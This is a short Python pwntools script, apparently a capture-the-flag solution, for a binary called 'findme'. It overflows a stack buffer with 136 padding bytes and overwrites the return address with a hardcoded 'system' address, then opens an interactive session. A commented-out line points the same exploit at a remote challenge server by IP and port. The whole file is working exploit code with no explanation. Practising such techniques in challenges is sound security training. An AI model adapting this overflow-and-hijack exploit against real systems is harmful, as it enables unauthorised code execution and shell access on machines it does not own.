#!/usr/bin/env python

from pwn import *

e = ELF("./findme")
offset = 136

#p = remote("159.65.13.76", 63003)
p = process("./findme")

system_addr = 0x40089c

payload = 'A' * offset + p64(system_addr)
p.recvuntil("token:")

p.sendline(payload)
p.interactive()